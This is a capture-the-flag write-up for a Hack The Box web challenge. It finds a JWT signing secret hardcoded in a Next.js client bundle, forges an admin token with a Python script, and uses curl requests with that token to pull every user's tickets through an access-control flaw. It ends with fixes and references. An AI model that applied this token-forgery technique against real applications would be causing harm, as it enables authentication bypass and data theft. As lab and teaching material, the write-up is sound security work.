# HTB - CriticalOps

**Category:** Web
**Vulnerability Class:** Hardcoded JWT Signing Secret (Authentication Bypass) + Broken Access Control (IDOR)
**Target:** `154.57.164.65:32394`

## Challenge Scenario

> CriticalOps is a web app used to monitor critical infrastructure in the XYZ region. Users submit tickets to report unusual behavior. Please uncover potential vulnerabilities, and retrieve the hidden flag within the system.

## Recon

The app is a Next.js (App Router) infrastructure-monitoring dashboard sitting behind nginx, served over HTTPS on a self-signed cert (browsing `http://` to the port returns nginx's classic `400 Bad Request — The plain HTTP request was sent to HTTPS port`).

The login page's JS bundle was pulled and grepped for API routes:

```bash
curl -sk https://154.57.164.65:32394/_next/static/chunks/app/login/page-3883883019768f20.js \
  | grep -oE '"/api/[a-zA-Z0-9/_-]+"' | sort -u
```

Self-registration is open:

```bash
curl -sk -X POST https://154.57.164.65:32394/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test1234!","username":"test"}' -i
# {"message":"User registered successfully","userId":"03ef52e8-..."}
```

Logging in (the endpoint expects `username`, not `email`) confirms a `role` field is returned directly in the response body, and that regular users get `role: "user"`:

```bash
curl -sk -X POST https://154.57.164.65:32394/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"Test1234!"}' -i
# {"id":"03ef52e8-...","username":"test","role":"user"}
```

No `Set-Cookie` is issued — the app uses a bearer JWT that the client stores in `localStorage` instead of a session cookie, exactly as revealed by grepping the same JS bundle for auth-related keywords:

```bash
curl -sk https://154.57.164.65:32394/_next/static/chunks/app/login/page-3883883019768f20.js \
  | grep -oE '.{40}(token|Authorization|Bearer|localStorage|sessionStorage).{40}' -i
```

## The Vulnerability

**1. Hardcoded JWT signing secret shipped to the client.**

The same JS chunk contains the entire token-signing routine, including a hardcoded HS256 secret:

```js
let a = new TextEncoder().encode("SecretKey-CriticalOps-2025");

async function n(e) {
  return await new s.P(e)                    // s.P = jose's SignJWT
    .setProtectedHeader({ alg: "HS256" })
    .setIssuedAt()
    .setExpirationTime("8h")
    .sign(a);                                 // signed with the hardcoded secret above
}
```

And the exact payload shape used at login:

```js
let s = await t.json(),
    a = await (0, N.HU)({ userId: s.id, username: s.username, role: s.role });
o(a); // login(token) -> stored in localStorage
"admin" === s.role ? r.push("/admin") : r.push("/dashboard");
```

This is functionally identical to the OpenSecret challenge's flaw (a symmetric signing secret exposed to anyone who reads the page source), except here the *entire client-side JWT issuance logic* — not just the secret — was bundled into a file the browser downloads. Since HS256 is symmetric, whoever holds the secret can both verify **and forge** tokens with arbitrary claims, including `role: "admin"`.

**2. Broken Access Control / IDOR on `/api/tickets`.**

Once authenticated as "admin" via a forged token, `/api/tickets` returns **every user's tickets**, not just the caller's — a horizontal access-control failure on top of the authentication bypass.

## Exploitation

**1. Forge an admin JWT** using the leaked secret and the known payload shape:

```python
import jwt
import datetime

secret = "SecretKey-CriticalOps-2025"

payload = {
    "userId": "03ef52e8-2bde-448f-97c6-128a10122534",  # any registered user id works
    "username": "admin",
    "role": "admin",
    "iat": datetime.datetime.utcnow(),
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=8)
}

forged = jwt.encode(payload, secret, algorithm="HS256")
print(forged)
```

**2. Use the forged token against the protected API routes:**

```bash
TOKEN="<forged token>"

curl -sk https://154.57.164.65:32394/api/controls -H "Authorization: Bearer $TOKEN" -i
curl -sk https://154.57.164.65:32394/api/sensors  -H "Authorization: Bearer $TOKEN" -i
curl -sk https://154.57.164.65:32394/api/tickets  -H "Authorization: Bearer $TOKEN" -i
```

`/api/controls` and `/api/sensors` return live infrastructure state (network/power/water switches), confirming the forged admin token is fully accepted server-side. `/api/tickets` returns the full ticket list across all users:

```json
{
  "id": "72bec4b5-2d78-40a7-a175-7f82e37c74ad",
  "userId": "0bc6903a-d902-43b5-a084-0527e1bfa46f",
  "title": "HTB{Wh0_Put_JWT_1n_Cl13nt_S1d3_lm4o}",

## Root Cause & Fix

- **Never ship signing/verification secrets or logic to the client.** JWT issuance and verification must happen entirely server-side. If a framework's bundler (e.g. Next.js) pulls a shared module into a client chunk, isolate server-only code (e.g. with `server-only` imports) so a build-time error catches this before deployment.
- **Use a strong, randomly generated secret** (32+ bytes, e.g. from a CSPRNG) stored in a secrets manager or environment variable never exposed to a bundler — pyjwt/jose both warned that this 26-byte string was already below the recommended HMAC key length even before considering it was public.
- **Never trust a client-supplied or client-echoed `role` claim without re-validating server-side** against the actual user record on every request — don't rely solely on JWT signature validity as a stand-in for full authorization.
- **Enforce object-level/user-level authorization on every endpoint** (`/api/tickets` should filter by the authenticated user's own ID unless they are verified as admin against the database, not just a JWT claim) — this is the broken-access-control half of the bug and would still be exploitable even with a properly secret-managed JWT if an attacker legitimately obtained an admin account.
- Consider asymmetric signing (RS256/ES256) for any token whose *verification* might ever need to happen somewhere less trusted — the private signing key never has to leave the server.

## References

- [OWASP: Testing JSON Web Tokens](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)
- [HTB Academy: Attacking Authentication Mechanisms](https://academy.hackthebox.com/)
- [HTB Academy: Attacking Broken Access Controls](https://academy.hackthebox.com/)
- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
